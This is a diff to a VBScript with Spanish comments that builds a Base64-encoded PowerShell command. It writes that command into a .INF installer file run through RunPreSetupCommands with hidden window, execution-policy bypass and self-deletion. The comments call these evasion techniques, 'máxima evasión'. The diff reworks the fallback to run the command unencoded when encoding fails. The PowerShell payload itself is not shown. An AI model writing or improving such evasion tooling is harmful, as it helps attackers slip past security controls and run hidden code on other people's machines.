@@ -71,22 +71,13 @@ psCmd = psCmdPart1 & psCmdPart2 & psCmdPart3 & psCmdPart4 & psCmdPart5 & psCmdPa
 Dim encodedCmd
 encodedCmd = EncodeToBase64Unicode(psCmd)
 
-' Variable para indicar si se usará encoding
-Dim useEncoding
-useEncoding = False
-
-' Si el encoding falla, usar comando directo (menos evasión pero funcional)
-If encodedCmd <> "" And Len(encodedCmd) > 50 Then
-    useEncoding = True
-End If
-
 ' Función mejorada para codificar a Base64 Unicode
 Function EncodeToBase64Unicode(text)
     On Error Resume Next
     Dim stream, xmlDoc, xmlNode
     Dim byteData
     
-    ' Usar ADODB.Stream para convertir texto a bytes Unicode
+    ' Método 1: Usar ADODB.Stream
     Set stream = CreateObject("ADODB.Stream")
     stream.Type = 2
     stream.Charset = "UTF-16LE"
@@ -96,31 +87,36 @@ Function EncodeToBase64Unicode(text)
     stream.Type = 1
     stream.Position = 0
     
-    ' Leer todos los bytes
     byteData = stream.Read(-1)
     stream.Close
     Set stream = Nothing
     
-    ' Convertir a Base64 usando XML DOM
+    ' Convertir a Base64
     Set xmlDoc = CreateObject("Msxml2.DOMDocument.6.0")
     Set xmlNode = xmlDoc.CreateElement("base64")
     xmlNode.DataType = "bin.base64"
     
-    ' Intentar asignar bytes - si falla, retornar cadena vacía
-    Err.Clear
+    ' Intentar asignar bytes
+    On Error Resume Next
     xmlNode.nodeTypedValue = byteData
     
     If Err.Number = 0 Then
         EncodeToBase64Unicode = Replace(Replace(xmlNode.Text, vbCrLf, ""), vbLf, "")
     Else
-        ' Si falla la codificación, retornar cadena vacía (se usará método alternativo)
+        ' Si falla, usar método alternativo sin encoding (menos evasión pero funcional)
         EncodeToBase64Unicode = ""
     End If
     
+    On Error GoTo 0
     Set xmlNode = Nothing
     Set xmlDoc = Nothing
-    On Error GoTo 0
 End Function
+
+' Si el encoding falla, usar comando sin encoding (menos evasión pero funcional)
+If encodedCmd = "" Then
+    ' Usar comando directo sin encoding Base64
+    encodedCmd = psCmd
+End If
 
 ' ============================================
 ' CREAR ARCHIVO .INF CON TÉCNICAS DE EVASIÓN
@@ -133,14 +129,16 @@ infPart1 = "[version]" & vbCrLf & "Signature=$CHICAGO$" & vbCrLf & "AdvancedINF=
 infPart2 = "[DefaultInstall]" & vbCrLf & "CustomDestination=CustomDestAllUsers" & vbCrLf
 infPart3 = "RunPreSetupCommands=RunPreSetupCommandsSection" & vbCrLf
 infPart4 = "[RunPreSetupCommandsSection]" & vbCrLf
-' Usar encoding solo si está disponible, sino usar comando directo
-If useEncoding = True Then
+
+' Usar comando con o sin encoding según disponibilidad
+If InStr(encodedCmd, "-EncodedCommand") > 0 Or encodedCmd = "" Then
+    ' Comando sin encoding Base64 (menos evasión pero funcional)
+    infPart5 = "cmd.exe /c " & psCmd & vbCrLf
+Else
     ' Comando con encoding Base64 (máxima evasión)
     infPart5 = "cmd.exe /c powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -EncodedCommand " & encodedCmd & vbCrLf
-Else
-    ' Comando directo sin encoding (menos evasión pero funcional)
-    infPart5 = "cmd.exe /c " & psCmd & vbCrLf
 End If
+
 infPart6 = "timeout /t 1 /nobreak >nul 2>&1" & vbCrLf
 infPart7 = "del /q /f " & Chr(34) & infFile & Chr(34) & " 2>nul" & vbCrLf
 infPart8 = "[CustomDestAllUsers]" & vbCrLf & "49000,49001=AllUSer_LDIDSection, 7" & vbCrLf
